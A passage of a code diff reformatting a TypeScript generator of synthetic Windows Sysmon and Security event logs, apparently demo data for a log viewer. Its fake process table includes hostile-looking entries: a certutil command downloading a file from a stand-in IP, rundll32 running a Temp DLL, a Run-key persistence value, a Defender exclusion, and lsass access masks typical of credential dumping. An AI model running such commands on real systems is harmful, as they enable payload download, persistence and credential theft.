@@ -118,32 +118,230 @@ interface Proc {
   integrity: string;
   pid: number;
 }
-const P = (image: string, cmd: string, user: string, desc: string, company: string, ver: string, integrity: string, pid: number): Proc => ({ image, cmd, user, desc, company, ver, integrity, pid });
+const P = (
+  image: string,
+  cmd: string,
+  user: string,
+  desc: string,
+  company: string,
+  ver: string,
+  integrity: string,
+  pid: number,
+): Proc => ({ image, cmd, user, desc, company, ver, integrity, pid });
 const MS = "Microsoft Corporation";
 const W = "10.0.26100.1 (WinBuild.160101.0800)";
 const PROCS: Proc[] = [
-  P("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule", SYSTEM, "Host Process for Windows Services", MS, W, "System", 1844),
-  P("C:\\Windows\\System32\\svchost.exe", "C:\\Windows\\System32\\svchost.exe -k NetworkService -p -s Dnscache", "NT AUTHORITY\\NETWORK SERVICE", "Host Process for Windows Services", MS, W, "System", 2216),
-  P("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none', ME, "Google Chrome", "Google LLC", "130.0.6723.70", "Medium", 9876),
-  P("C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe", '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer --lang=en-US --renderer-client-id=42 --time-ticks-at-unix-epoch=-1729851000123456', ME, "Google Chrome", "Google LLC", "130.0.6723.70", "Untrusted", 11220),
+  P(
+    "C:\\Windows\\System32\\svchost.exe",
+    "C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule",
+    SYSTEM,
+    "Host Process for Windows Services",
+    MS,
+    W,
+    "System",
+    1844,
+  ),
+  P(
+    "C:\\Windows\\System32\\svchost.exe",
+    "C:\\Windows\\System32\\svchost.exe -k NetworkService -p -s Dnscache",
+    "NT AUTHORITY\\NETWORK SERVICE",
+    "Host Process for Windows Services",
+    MS,
+    W,
+    "System",
+    2216,
+  ),
+  P(
+    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none',
+    ME,
+    "Google Chrome",
+    "Google LLC",
+    "130.0.6723.70",
+    "Medium",
+    9876,
+  ),
+  P(
+    "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+    '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe" --type=renderer --lang=en-US --renderer-client-id=42 --time-ticks-at-unix-epoch=-1729851000123456',
+    ME,
+    "Google Chrome",
+    "Google LLC",
+    "130.0.6723.70",
+    "Untrusted",
+    11220,
+  ),
   P("C:\\Windows\\explorer.exe", "C:\\Windows\\Explorer.EXE", ME, "Windows Explorer", MS, W, "Medium", 6512),
-  P("C:\\Program Files\\Shellmosaic\\shellmosaic.exe", '"C:\\Program Files\\Shellmosaic\\shellmosaic.exe"', ME, "Shellmosaic", "Shellmosaic", "0.3.0", "Medium", 14388),
-  P("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "powershell.exe -NoLogo -NoProfile", ME, "Windows PowerShell", MS, W, "Medium", 0),
-  P("C:\\Program Files\\PowerShell\\7\\pwsh.exe", '"C:\\Program Files\\PowerShell\\7\\pwsh.exe" -NoLogo', ME, "pwsh", MS, "7.4.6.500", "Medium", 0),
-  P("C:\\Windows\\System32\\cmd.exe", 'C:\\Windows\\system32\\cmd.exe /c "whoami /all"', ME, "Windows Command Processor", MS, W, "Medium", 0),
-  P("C:\\Program Files\\Git\\cmd\\git.exe", "git status --porcelain=v2 --branch", ME, "Git for Windows", "The Git Development Community", "2.47.0.windows.1", "Medium", 0),
-  P("C:\\Program Files\\nodejs\\node.exe", '"C:\\Program Files\\nodejs\\node.exe" C:\\src\\shellmosaic\\node_modules\\vite\\bin\\vite.js --port 5180', ME, "Node.js JavaScript Runtime", "Node.js", "24.11.0", "Medium", 15020),
-  P("C:\\Users\\alex\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe", '"C:\\Users\\alex\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe" --type=utility --utility-sub-type=node.mojom.NodeService', ME, "Visual Studio Code", MS, "1.95.1", "Medium", 13108),
-  P("C:\\Windows\\System32\\conhost.exe", "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1", ME, "Console Window Host", MS, W, "Medium", 0),
-  P("C:\\Windows\\System32\\wbem\\WmiPrvSE.exe", "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding", "NT AUTHORITY\\NETWORK SERVICE", "WMI Provider Host", MS, W, "System", 4920),
-  P("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe", '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe"', SYSTEM, "Antimalware Service Executable", MS, "4.18.24090.11", "System", 4388),
-  P("C:\\Windows\\System32\\rundll32.exe", "rundll32.exe C:\\Users\\alex\\AppData\\Local\\Temp\\upd4721.dll,DllRegisterServer", ME, "Windows host process (Rundll32)", MS, W, "Medium", 0),
-  P("C:\\Windows\\System32\\certutil.exe", "certutil.exe -urlcache -split -f http://198.51.100.23:8080/a.txt C:\\Users\\Public\\a.txt", ME, "CertUtil.exe", MS, W, "Medium", 0),
-  P("C:\\Games\\Counter-Strike 2\\game\\bin\\win64\\cs2.exe", '"C:\\Games\\Counter-Strike 2\\game\\bin\\win64\\cs2.exe" -steam -novid', ME, "Counter-Strike 2", "Valve", "1.40.3.8", "Medium", 17744),
-  P("C:\\Users\\alex\\Tools\\loader.exe", '"C:\\Users\\alex\\Tools\\loader.exe" --attach cs2.exe', ME, "", "", "", "High", 18240),
-  P("C:\\Windows\\System32\\taskhostw.exe", "taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly", ME, "Host Process for Windows Tasks", MS, W, "Medium", 0),
-  P("C:\\Windows\\System32\\SearchProtocolHost.exe", '"C:\\Windows\\system32\\SearchProtocolHost.exe" Global\\UsGthrFltPipeMssGthrPipe12_ Global\\UsGthrCtrlFltPipeMssGthrPipe12 1 -2147483646', SYSTEM, "Microsoft Windows Search Protocol Host", MS, W, "System", 0),
-  P("C:\\Program Files\\Sysinternals\\procexp64.exe", '"C:\\Program Files\\Sysinternals\\procexp64.exe"', ME, "Sysinternals Process Explorer", "Sysinternals - www.sysinternals.com", "17.06", "High", 8044),
+  P(
+    "C:\\Program Files\\Shellmosaic\\shellmosaic.exe",
+    '"C:\\Program Files\\Shellmosaic\\shellmosaic.exe"',
+    ME,
+    "Shellmosaic",
+    "Shellmosaic",
+    "0.3.0",
+    "Medium",
+    14388,
+  ),
+  P(
+    "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+    "powershell.exe -NoLogo -NoProfile",
+    ME,
+    "Windows PowerShell",
+    MS,
+    W,
+    "Medium",
+    0,
+  ),
+  P(
+    "C:\\Program Files\\PowerShell\\7\\pwsh.exe",
+    '"C:\\Program Files\\PowerShell\\7\\pwsh.exe" -NoLogo',
+    ME,
+    "pwsh",
+    MS,
+    "7.4.6.500",
+    "Medium",
+    0,
+  ),
+  P(
+    "C:\\Windows\\System32\\cmd.exe",
+    'C:\\Windows\\system32\\cmd.exe /c "whoami /all"',
+    ME,
+    "Windows Command Processor",
+    MS,
+    W,
+    "Medium",
+    0,
+  ),
+  P(
+    "C:\\Program Files\\Git\\cmd\\git.exe",
+    "git status --porcelain=v2 --branch",
+    ME,
+    "Git for Windows",
+    "The Git Development Community",
+    "2.47.0.windows.1",
+    "Medium",
+    0,
+  ),
+  P(
+    "C:\\Program Files\\nodejs\\node.exe",
+    '"C:\\Program Files\\nodejs\\node.exe" C:\\src\\shellmosaic\\node_modules\\vite\\bin\\vite.js --port 5180',
+    ME,
+    "Node.js JavaScript Runtime",
+    "Node.js",
+    "24.11.0",
+    "Medium",
+    15020,
+  ),
+  P(
+    "C:\\Users\\alex\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe",
+    '"C:\\Users\\alex\\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe" --type=utility --utility-sub-type=node.mojom.NodeService',
+    ME,
+    "Visual Studio Code",
+    MS,
+    "1.95.1",
+    "Medium",
+    13108,
+  ),
+  P(
+    "C:\\Windows\\System32\\conhost.exe",
+    "\\??\\C:\\Windows\\system32\\conhost.exe 0xffffffff -ForceV1",
+    ME,
+    "Console Window Host",
+    MS,
+    W,
+    "Medium",
+    0,
+  ),
+  P(
+    "C:\\Windows\\System32\\wbem\\WmiPrvSE.exe",
+    "C:\\Windows\\system32\\wbem\\wmiprvse.exe -secured -Embedding",
+    "NT AUTHORITY\\NETWORK SERVICE",
+    "WMI Provider Host",
+    MS,
+    W,
+    "System",
+    4920,
+  ),
+  P(
+    "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe",
+    '"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24090.11-0\\MsMpEng.exe"',
+    SYSTEM,
+    "Antimalware Service Executable",
+    MS,
+    "4.18.24090.11",
+    "System",
+    4388,
+  ),
+  P(
+    "C:\\Windows\\System32\\rundll32.exe",
+    "rundll32.exe C:\\Users\\alex\\AppData\\Local\\Temp\\upd4721.dll,DllRegisterServer",
+    ME,
+    "Windows host process (Rundll32)",
+    MS,
+    W,
+    "Medium",
+    0,
+  ),
+  P(
+    "C:\\Windows\\System32\\certutil.exe",
+    "certutil.exe -urlcache -split -f http://198.51.100.23:8080/a.txt C:\\Users\\Public\\a.txt",
+    ME,
+    "CertUtil.exe",
+    MS,
+    W,
+    "Medium",
+    0,
+  ),
+  P(
+    "C:\\Games\\Counter-Strike 2\\game\\bin\\win64\\cs2.exe",
+    '"C:\\Games\\Counter-Strike 2\\game\\bin\\win64\\cs2.exe" -steam -novid',
+    ME,
+    "Counter-Strike 2",
+    "Valve",
+    "1.40.3.8",
+    "Medium",
+    17744,
+  ),
+  P(
+    "C:\\Users\\alex\\Tools\\loader.exe",
+    '"C:\\Users\\alex\\Tools\\loader.exe" --attach cs2.exe',
+    ME,
+    "",
+    "",
+    "",
+    "High",
+    18240,
+  ),
+  P(
+    "C:\\Windows\\System32\\taskhostw.exe",
+    "taskhostw.exe -RegisterDevice -ProtectionStateChanged -FreeNetworkOnly",
+    ME,
+    "Host Process for Windows Tasks",
+    MS,
+    W,
+    "Medium",
+    0,
+  ),
+  P(
+    "C:\\Windows\\System32\\SearchProtocolHost.exe",
+    '"C:\\Windows\\system32\\SearchProtocolHost.exe" Global\\UsGthrFltPipeMssGthrPipe12_ Global\\UsGthrCtrlFltPipeMssGthrPipe12 1 -2147483646',
+    SYSTEM,
+    "Microsoft Windows Search Protocol Host",
+    MS,
+    W,
+    "System",
+    0,
+  ),
+  P(
+    "C:\\Program Files\\Sysinternals\\procexp64.exe",
+    '"C:\\Program Files\\Sysinternals\\procexp64.exe"',
+    ME,
+    "Sysinternals Process Explorer",
+    "Sysinternals - www.sysinternals.com",
+    "17.06",
+    "High",
+    8044,
+  ),
 ];
 const WEIGHTS = [8, 4, 9, 6, 4, 6, 3, 2, 3, 3, 2, 3, 3, 2, 2, 0.6, 0.4, 2, 0.7, 2, 2, 1];
 const LSASS_IMG = "C:\\Windows\\system32\\lsass.exe";
@@ -186,7 +384,11 @@ const SYSMON_TASKS: Record<number, [string, string]> = {
 function sysmon(id: number, t: number, r: Rng, fields: [string, string][]): Spec {
   const [title, rule] = SYSMON_TASKS[id];
   const data: [string, string][] = [["RuleName", "-"], ["UtcTime", utc(t)], ...fields];
-  if (id === 13 || id === 12 || id === 17) data.splice(1, 0, ["EventType", id === 13 ? "SetValue" : id === 12 ? pick(r, ["CreateKey", "DeleteKey"]) : "CreatePipe"]);
+  if (id === 13 || id === 12 || id === 17)
+    data.splice(1, 0, [
+      "EventType",
+      id === 13 ? "SetValue" : id === 12 ? pick(r, ["CreateKey", "DeleteKey"]) : "CreatePipe",
+    ]);
   const rn = fields.find(([k]) => k === "RuleName");
   if (rn) data.shift();
   return {
@@ -220,7 +422,11 @@ const DNS: [string, string, string][] = [
   ["github.com", "0", "::ffff:140.82.121.4;"],
   ["update.googleapis.com", "0", "type:  5 update.l.google.com;::ffff:142.250.185.67;"],
   ["login.microsoftonline.com", "0", "type:  5 login.mso.msidentity.com;::ffff:20.190.159.2;::ffff:40.126.31.67;"],
-  ["settings-win.data.microsoft.com", "0", "type:  5 atm-settingsfe-prod-geo2.trafficmanager.net;::ffff:51.104.15.252;"],
+  [
+    "settings-win.data.microsoft.com",
+    "0",
+    "type:  5 atm-settingsfe-prod-geo2.trafficmanager.net;::ffff:51.104.15.252;",
+  ],
   ["raw.githubusercontent.com", "0", "::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;"],
   ["wpad", "9003", "-"],
   ["steamcommunity.com", "0", "::ffff:104.103.84.217;"],
@@ -228,7 +434,12 @@ const DNS: [string, string, string][] = [
 ];
 const DLLS: [string, string, string, string][] = [
   ["C:\\Windows\\System32\\amsi.dll", "Anti-Malware Scan Interface", "true", "Microsoft Windows"],
-  ["C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll", "Microsoft .NET Runtime Common Language Runtime - WorkStation", "true", "Microsoft Corporation"],
+  [
+    "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\clr.dll",
+    "Microsoft .NET Runtime Common Language Runtime - WorkStation",
+    "true",
+    "Microsoft Corporation",
+  ],
   ["C:\\Windows\\System32\\dbghelp.dll", "Windows Image Helper", "true", "Microsoft Windows"],
   ["C:\\Windows\\System32\\vaultcli.dll", "Credential Vault Client Library", "true", "Microsoft Windows"],
   ["C:\\Windows\\System32\\wininet.dll", "Internet Extensions for Win32", "true", "Microsoft Windows"],
@@ -245,11 +456,24 @@ const FILES = [
   "C:\\Users\\Public\\a.txt",
 ];
 const REG: [string, string][] = [
-  ["HKU\\" + USER_SID + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater", "C:\\Users\\alex\\AppData\\Local\\Temp\\upd.exe"],
-  ["HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\" + USER_SID + "\\\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe", "Binary Data"],
+  [
+    "HKU\\" + USER_SID + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Updater",
+    "C:\\Users\\alex\\AppData\\Local\\Temp\\upd.exe",
+  ],
+  [
+    "HKLM\\System\\CurrentControlSet\\Services\\bam\\State\\UserSettings\\" +
+      USER_SID +
+      "\\\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe",
+    "Binary Data",
+  ],
   ["HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\\C:\\Users\\alex\\Tools", "DWORD (0x00000000)"],
   ["HKLM\\System\\CurrentControlSet\\Services\\W32Time\\Config\\LastKnownGoodTime", "QWORD (0x01db26e0-0x8f2c1a00)"],
-  ["HKU\\" + USER_SID + "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA", "Binary Data"],
+  [
+    "HKU\\" +
+      USER_SID +
+      "\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\UserAssist\\{CEBFF5CD-ACE2-4F4F-9178-9926F41749EA}\\Count\\HRZR_PGYFRFFVBA",
+    "Binary Data",
+  ],
 ];
 
 const sysmonMaker: Maker = (r, t) => {
@@ -288,7 +512,8 @@ const sysmonMaker: Maker = (r, t) => {
       ]);
     }
     case 3: {
-      const [ip, host, port, name] = p.image.includes("rundll32") || p.image.includes("certutil") ? NET[8] : pick(r, NET.slice(0, 8));
+      const [ip, host, port, name] =
+        p.image.includes("rundll32") || p.image.includes("certutil") ? NET[8] : pick(r, NET.slice(0, 8));
       const udp = port === 53;
       return sysmon(3, t, r, [
         ...base,
@@ -331,7 +556,9 @@ const sysmonMaker: Maker = (r, t) => {
       const src = id === 8 ? PROCS[15] : pick(r, [PROCS[21], PROCS[18], PROCS[14], PROCS[15], PROCS[4]]);
       const spid = pidOf(r, src);
       const lsass = src !== PROCS[18];
-      const target = lsass ? { image: LSASS_IMG, pid: LSASS, user: SYSTEM } : { image: PROCS[17].image, pid: PROCS[17].pid, user: ME };
+      const target = lsass
+        ? { image: LSASS_IMG, pid: LSASS, user: SYSTEM }
+        : { image: PROCS[17].image, pid: PROCS[17].pid, user: ME };
       if (id === 8) {
         const tgt = PROCS[4];
         return sysmon(8, t, r, [
@@ -358,13 +585,23 @@ const sysmonMaker: Maker = (r, t) => {
         ["TargetProcessId", String(target.pid)],
         ["TargetImage", target.image],
         ["GrantedAccess", lsass ? pick(r, ["0x1010", "0x1410", "0x1000", "0x1FFFFF"]) : "0x1F3FFF"],
-        ["CallTrace", "C:\\Windows\\SYSTEM32\\ntdll.dll+9f4d4|C:\\Windows\\System32\\KERNELBASE.dll+2b54e|" + src.image + "+1a3f2|C:\\Windows\\System32\\KERNEL32.DLL+17374"],
+        [
+          "CallTrace",
+          "C:\\Windows\\SYSTEM32\\ntdll.dll+9f4d4|C:\\Windows\\System32\\KERNELBASE.dll+2b54e|" +
+            src.image +
+            "+1a3f2|C:\\Windows\\System32\\KERNEL32.DLL+17374",
+        ],
         ["SourceUser", src.user],
         ["TargetUser", target.user],
       ]);
     }
     case 11:
-      return sysmon(11, t, r, [...base, ["TargetFilename", pick(r, FILES)], ["CreationUtcTime", utc(t - int(r, 0, 5000))], ["User", p.user]]);
+      return sysmon(11, t, r, [
+        ...base,
+        ["TargetFilename", pick(r, FILES)],
+        ["CreationUtcTime", utc(t - int(r, 0, 5000))],
+        ["User", p.user],
+      ]);
     case 12:
       return sysmon(12, t, r, [...base, ["TargetObject", pick(r, REG)[0].replace(/\\[^\\]+$/, "")], ["User", p.user]]);
     case 13: {
@@ -375,22 +612,52 @@ const sysmonMaker: Maker = (r, t) => {
       return sysmon(17, t, r, [
         ["ProcessGuid", procGuid(p, pid)],
         ["ProcessId", String(pid)],
-        ["PipeName", pick(r, [`\\mojo.${pid}.${int(r, 1000, 9999)}.${int(r, 1e8, 9e8)}`, `\\PSHost.13374${int(r, 1e8, 9e8)}.${pid}.DefaultAppDomain.powershell`, "\\msagent_4f", `\\crashpad_${pid}_KQWZXHFNRNWLBDPI`])],
+        [
+          "PipeName",
+          pick(r, [
+            `\\mojo.${pid}.${int(r, 1000, 9999)}.${int(r, 1e8, 9e8)}`,
+            `\\PSHost.13374${int(r, 1e8, 9e8)}.${pid}.DefaultAppDomain.powershell`,
+            "\\msagent_4f",
+            `\\crashpad_${pid}_KQWZXHFNRNWLBDPI`,
+          ]),
+        ],
         ["Image", p.image],
         ["User", p.user],
       ]);
     case 22: {
       const [qn, status, res] = p.image.includes("rundll32") ? DNS[7] : pick(r, DNS.slice(0, 7));
-      return sysmon(22, t, r, [["ProcessGuid", procGuid(p, pid)], ["ProcessId", String(pid)], ["QueryName", qn], ["QueryStatus", status], ["QueryResults", res], ["Image", p.image], ["User", p.user]]);
+      return sysmon(22, t, r, [
+        ["ProcessGuid", procGuid(p, pid)],
+        ["ProcessId", String(pid)],
+        ["QueryName", qn],
+        ["QueryStatus", status],
+        ["QueryResults", res],
+        ["Image", p.image],
+        ["User", p.user],
+      ]);
     }
     default:
-      return sysmon(23, t, r, [["ProcessGuid", procGuid(p, pid)], ["ProcessId", String(pid)], ["User", p.user], ["Image", p.image], ["TargetFilename", pick(r, FILES)], ["Hashes", imageHash(String(t))], ["IsExecutable", "false"], ["Archived", "true"]]);
+      return sysmon(23, t, r, [
+        ["ProcessGuid", procGuid(p, pid)],
+        ["ProcessId", String(pid)],
+        ["User", p.user],
+        ["Image", p.image],
+        ["TargetFilename", pick(r, FILES)],
+        ["Hashes", imageHash(String(t))],
+        ["IsExecutable", "false"],
+        ["Archived", "true"],
+      ]);
   }
 };
 
 // ── Security ─────────────────────────────────────────────────────────────
 
-const SEC = { provider: "Microsoft-Windows-Security-Auditing", guid: "{54849625-5478-4994-a5ba-3e3b0328c30d}", pid: LSASS, level: 0 } as const;
+const SEC = {
+  provider: "Microsoft-Windows-Security-Auditing",
+  guid: "{54849625-5478-4994-a5ba-3e3b0328c30d}",
+  pid: LSASS,
+  level: 0,
+} as const;
 const OK = { keywords: "0x8020000000000000", keywordNames: ["Audit Success"] };
 const FAIL = { keywords: "0x8010000000000000", keywordNames: ["Audit Failure"] };
 const LOGON_TYPES = [2, 3, 5, 7, 10, 11];
@@ -411,8 +678,14 @@ function subject(sid = "S-1-5-18", name = `${HOST}$`, domain = "WORKGROUP", logo
 }
 
 const securityMaker: Maker = (r, t) => {
-  const id = weighted(r, [5156, 4624, 4672, 4688, 4689, 4634, 4798, 5379, 4625, 4648, 4776, 4697, 4698, 4720, 4732, 4740, 1102], [25, 18, 12, 12, 10, 8, 4, 4, 5, 2, 2, 0.3, 0.4, 0.15, 0.2, 0.2, 0.05]);
-  const logon = hx(int(r, 0x10000, 0xfffff)).toUpperCase().replace("0X", "0x");
+  const id = weighted(
+    r,
+    [5156, 4624, 4672, 4688, 4689, 4634, 4798, 5379, 4625, 4648, 4776, 4697, 4698, 4720, 4732, 4740, 1102],
+    [25, 18, 12, 12, 10, 8, 4, 4, 5, 2, 2, 0.3, 0.4, 0.15, 0.2, 0.2, 0.05],
+  );
+  const logon = hx(int(r, 0x10000, 0xfffff))
+    .toUpperCase()
+    .replace("0X", "0x");
   switch (id) {
     case 4624: {
       const lt = weighted(r, LOGON_TYPES, [6, 3, 10, 2, 1, 1]);
@@ -439,7 +712,10 @@ const securityMaker: Maker = (r, t) => {
           ["WorkstationName", remote ? HOST : "-"],
           ["LogonGuid", "{00000000-0000-0000-0000-000000000000}"],
           ["ProcessId", sys ? "0x2f0" : "0x" + int(r, 0x200, 0x3000).toString(16)],
-          ["ProcessName", sys ? "C:\\Windows\\System32\\services.exe" : remote ? "-" : "C:\\Windows\\System32\\svchost.exe"],
+          [
+            "ProcessName",
+            sys ? "C:\\Windows\\System32\\services.exe" : remote ? "-" : "C:\\Windows\\System32\\svchost.exe",
+          ],
           ["IpAddress", remote ? ip : sys ? "-" : "127.0.0.1"],
           ["IpPort", remote ? String(int(r, 1024, 65535)) : sys ? "-" : "0"],
           ["ImpersonationLevel", "%%1833"],
@@ -495,7 +771,13 @@ const securityMaker: Maker = (r, t) => {
         eventId: 4672,
         task: 12548,
         taskName: "Special Logon",
-        data: [...subject("S-1-5-18", "SYSTEM", "NT AUTHORITY"), ["PrivilegeList", "SeAssignPrimaryTokenPrivilege\n\t\t\tSeTcbPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeAuditPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeImpersonatePrivilege\n\t\t\tSeDelegateSessionUserImpersonatePrivilege"]],
+        data: [
+          ...subject("S-1-5-18", "SYSTEM", "NT AUTHORITY"),
+          [
+            "PrivilegeList",
+            "SeAssignPrimaryTokenPrivilege\n\t\t\tSeTcbPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeAuditPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeImpersonatePrivilege\n\t\t\tSeDelegateSessionUserImpersonatePrivilege",
+          ],
+        ],
         message:
           "Special privileges assigned to new logon.\n\nSubject:\n\tSecurity ID:\t\tS-1-5-18\n\tAccount Name:\t\tSYSTEM\n\tAccount Domain:\t\tNT AUTHORITY\n\tLogon ID:\t\t0x3E7\n\nPrivileges:\t\tSeAssignPrimaryTokenPrivilege\n\t\t\tSeTcbPrivilege\n\t\t\tSeSecurityPrivilege\n\t\t\tSeTakeOwnershipPrivilege\n\t\t\tSeLoadDriverPrivilege\n\t\t\tSeBackupPrivilege\n\t\t\tSeRestorePrivilege\n\t\t\tSeDebugPrivilege\n\t\t\tSeAuditPrivilege\n\t\t\tSeSystemEnvironmentPrivilege\n\t\t\tSeImpersonatePrivilege",
       };
@@ -512,7 +794,17 @@ const securityMaker: Maker = (r, t) => {
           eventId: 4689,
           task: 13313,
           taskName: "Process Termination",
-          data: [...subject(mine ? USER_SID : "S-1-5-18", mine ? USER : `${HOST}$`, mine ? HOST : "WORKGROUP", mine ? "0xBC0A1" : "0x3E7"), ["Status", "0x0"], ["ProcessId", hx(pid)], ["ProcessName", p.image]],
+          data: [
+            ...subject(
+              mine ? USER_SID : "S-1-5-18",
+              mine ? USER : `${HOST}$`,
+              mine ? HOST : "WORKGROUP",
+              mine ? "0xBC0A1" : "0x3E7",
+            ),
+            ["Status", "0x0"],
+            ["ProcessId", hx(pid)],
+            ["ProcessName", p.image],
+          ],
           message: `A process has exited.\n\nSubject:\n\tSecurity ID:\t\t${mine ? USER_SID : "S-1-5-18"}\n\tAccount Name:\t\t${mine ? USER : HOST + "$"}\n\nProcess Information:\n\tProcess ID:\t0x${pid.toString(16)}\n\tProcess Name:\t${p.image}\n\tExit Status:\t0x0`,
         };
       return {
@@ -523,7 +815,12 @@ const securityMaker: Maker = (r, t) => {
         task: 13312,
         taskName: "Process Creation",
         data: [
-          ...subject(mine ? USER_SID : "S-1-5-18", mine ? USER : `${HOST}$`, mine ? HOST : "WORKGROUP", mine ? "0xBC0A1" : "0x3E7"),
+          ...subject(
+            mine ? USER_SID : "S-1-5-18",
+            mine ? USER : `${HOST}$`,
+            mine ? HOST : "WORKGROUP",
+            mine ? "0xBC0A1" : "0x3E7",
+          ),
           ["NewProcessId", hx(pid)],
           ["NewProcessName", p.image],
           ["TokenElevationType", "%%1938"],
@@ -534,7 +831,10 @@ const securityMaker: Maker = (r, t) => {
           ["TargetDomainName", "-"],
           ["TargetLogonId", "0x0"],
           ["ParentProcessName", parent.image],
-          ["MandatoryLabel", p.integrity === "System" ? "S-1-16-16384" : p.integrity === "High" ? "S-1-16-12288" : "S-1-16-8192"],
+          [
+            "MandatoryLabel",
+            p.integrity === "System" ? "S-1-16-16384" : p.integrity === "High" ? "S-1-16-12288" : "S-1-16-8192",
+          ],
         ],
         message:
           `A new process has been created.\n\nCreator Subject:\n\tSecurity ID:\t\t${mine ? USER_SID : "S-1-5-18"}\n\tAccount Name:\t\t${mine ? USER : HOST + "$"}\n\tAccount Domain:\t\t${mine ? HOST : "WORKGROUP"}\n\n` +
@@ -548,7 +848,13 @@ const securityMaker: Maker = (r, t) => {
         eventId: 4634,
         task: 12545,
         taskName: "Logoff",
-        data: [["TargetUserSid", USER_SID], ["TargetUserName", USER], ["TargetDomainName", HOST], ["TargetLogonId", logon], ["LogonType", "2"]],
+        data: [
+          ["TargetUserSid", USER_SID],
+          ["TargetUserName", USER],
+          ["TargetDomainName", HOST],
+          ["TargetLogonId", logon],
+          ["LogonType", "2"],
+        ],
         message: `An account was logged off.\n\nSubject:\n\tSecurity ID:\t\t${USER_SID}\n\tAccount Name:\t\t${USER}\n\tAccount Domain:\t\t${HOST}\n\tLogon ID:\t\t${logon}\n\nLogon Type:\t\t\t2\n\nThis event is generated when a logon session is destroyed.`,
       };
     case 5156: {
@@ -585,7 +891,14 @@ const securityMaker: Maker = (r, t) => {
         eventId: 4798,
         task: 13824,
         taskName: "User Account Management",
-        data: [["TargetUserName", USER], ["TargetDomainName", HOST], ["TargetSid", USER_SID], ...subject(USER_SID, USER, HOST, "0xBC0A1"), ["CallerProcessId", "0x1970"], ["CallerProcessName", "C:\\Windows\\explorer.exe"]],
+        data: [
+          ["TargetUserName", USER],
+          ["TargetDomainName", HOST],
+          ["TargetSid", USER_SID],
+          ...subject(USER_SID, USER, HOST, "0xBC0A1"),
+          ["CallerProcessId", "0x1970"],
+          ["CallerProcessName", "C:\\Windows\\explorer.exe"],
+        ],
         message: `A user's local group membership was enumerated.\n\nSubject:\n\tSecurity ID:\t\t${USER_SID}\n\tAccount Name:\t\t${USER}\n\nUser:\n\tSecurity ID:\t\t${USER_SID}\n\tAccount Name:\t\t${USER}\n\nProcess Information:\n\tProcess ID:\t\t0x1970\n\tProcess Name:\t\tC:\\Windows\\explorer.exe`,
       };
     case 5379:
@@ -595,8 +908,29 @@ const securityMaker: Maker = (r, t) => {
         eventId: 5379,
         task: 13824,
         taskName: "User Account Management",
-        data: [...subject(USER_SID, USER, HOST, "0xBC0A1"), ["TargetName", pick(r, ["git:https://github.com", "MicrosoftAccount:user=alex@outlook.com", "Shellmosaic/ssh:prod-bastion"])], ["Type", "0"], ["CountOfCredentialsReturned", "1"], ["ReadOperation", "%%8100"], ["ReturnCode", "0"], ["ProcessCreationTime", new Date(t - 3600000).toISOString()], ["ClientProcessId", "14388"]],
-        message: "Credential Manager credentials were read.\n\nSubject:\n\tSecurity ID:\t\t" + USER_SID + "\n\tAccount Name:\t\talex\n\tAccount Domain:\t\t" + HOST + "\n\tLogon ID:\t\t0xBC0A1\n\tRead Operation:\t\tEnumerate Credentials\n\nThis event occurs when a user performs a read operation on stored credentials in Credential Manager.",
+        data: [
+          ...subject(USER_SID, USER, HOST, "0xBC0A1"),
+          [
+            "TargetName",
+            pick(r, [
+              "git:https://github.com",
